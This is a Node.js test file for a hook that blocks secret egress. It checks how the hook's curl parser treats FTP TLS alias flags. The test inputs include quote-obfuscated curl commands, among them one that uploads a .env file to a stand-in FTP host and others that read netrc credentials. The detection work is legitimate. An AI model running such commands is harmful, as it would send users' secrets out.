'use strict';
const test=require('node:test'),assert=require('node:assert/strict'),fs=require('node:fs'),path=require('node:path'),vm=require('node:vm');
const hooks=process.argv[2]||path.resolve(__dirname,'..'),{inspect}=require(path.join(hooks,'lib/git-guard-common.cjs'));
const source=fs.readFileSync(path.join(hooks,'block-secret-egress.cjs'),'utf8');
function slice(start,end){const a=source.indexOf(start),z=source.indexOf(end,a);assert.ok(a>=0&&z>a);assert.equal(source.indexOf(start,a+start.length),-1);return source.slice(a,z);}
// Execute production selectors. No test-side implementation of option parsing or TLS toggles.
const code=slice('function knownWord(word)',"/** Bash's first help/version")+
 slice('function quotedAttachedOptionValue(word, text, shortValues, longValues = [])','function arrayReaderCallback(invocation)')+
 slice('function wgetValueWord(word, offset)','/** Wget scalar options')+
 slice('// curl の値を取る option','function wgetSourceBoundary(invocation)')+
 slice('function proxyEnvironmentVerdict(invocation)','/** Return a typed refusal for the same executable egress shapes');
const api=vm.runInNewContext(code+'\n;({terminal:curlTerminalQuery,engine:curlSelectedEngineSource,route:curlSelectedRouteOperations,netrc:curlImplicitNetrc,upload:curlReadsUpload,proxy:proxyEnvironmentVerdict})',{URL},{timeout:1000});
function inv(cmd){const data=inspect(cmd,{trackOutboundEnvironment:true});assert.deepEqual(data.problems,[]);const v=data.invocations.find(x=>x.name==='curl');assert.ok(v);return v;}
const c=args=>inv("c''url -q "+args);
test('R37 aliases: selected engine and independent negative TLS toggles',()=>{
 for(const arg of ['--ftp-ssl','--ftp-ssl-reqd','--ssl','--no-ftp-ssl','--no-ftp-ssl-reqd','--ftp-ssl-reqd --no-ssl'])assert.equal(api.engine(c(arg+' --engine DUMMY ftp://target.invalid/DUMMY')),true,arg);
 for(const args of ['--ftp-ssl -A --engine ftp://target.invalid/DUMMY','--ftp-ssl --engine list ftp://target.invalid/DUMMY','--ftp-ssl-reqd --engine DUMMY --help'])assert.equal(api.engine(c(args)),false,args);
});
test('R37 aliases: terminal query consumes option-looking DATA',()=>{
 for(const arg of ['--ftp-ssl --help','--ftp-ssl-reqd --engine list ftp://target.invalid/DUMMY']){const v=c(arg);assert.equal(api.terminal(v.args,v.incomplete),true,arg);}
 const v=c('--ftp-ssl -A --help ftp://target.invalid/DUMMY');assert.equal(api.terminal(v.args,v.incomplete),false);
});
test('R37 aliases: route operations retain URL and negative flags',()=>{
 for(const arg of ['--ftp-ssl','--ftp-ssl-reqd','--no-ftp-ssl','--no-ftp-ssl-reqd']){const r=api.route(c(arg+' ftp://target.invalid/DUMMY'));assert.equal(r.length,1,arg);assert.equal(r[0].urls.length,1,arg);assert.equal(r[0].unknown,false,arg);}
});
test('R37 aliases: netrc remains independent and consumed DATA stays inactive',()=>{
 for(const arg of ['--ftp-ssl','--ftp-ssl-reqd']){const v=c(arg+' --netrc ftp://target.invalid/DUMMY');assert.equal(api.netrc(v.args,v.incomplete),'FORBIDDEN');}
 const v=c('--ftp-ssl -A --netrc ftp://target.invalid/DUMMY');assert.equal(api.netrc(v.args,v.incomplete),false);
});
test('R37 aliases: existing confirmed file upload and ordinary operation',()=>{
 const v=c('--ftp-ssl -T .e\'\'nv ftp://target.invalid/DUMMY');assert.equal(api.upload(v.args,v.incomplete),'FORBIDDEN');
 const ordinary=c('--ftp-ssl ftp://target.invalid/DUMMY');assert.equal(api.upload(ordinary.args,ordinary.incomplete),false);
});
test('R37 aliases: explicit proxy still suppresses an unused opaque ambient proxy',()=>{
 const v=inv('ftp_proxy="$PROXY" c\'\'url -q --ftp-ssl --proxy http://proxy.invalid ftp://target.invalid/DUMMY');
 assert.equal(v.outboundEnvironmentSources.some(x=>x.name==='ftp_proxy'),true);assert.equal(api.proxy(v),false);
 const selected=inv('ftp_proxy="$PROXY" c\'\'url -q --ftp-ssl ftp://target.invalid/DUMMY');assert.equal(api.proxy(selected),'UNKNOWN');
});
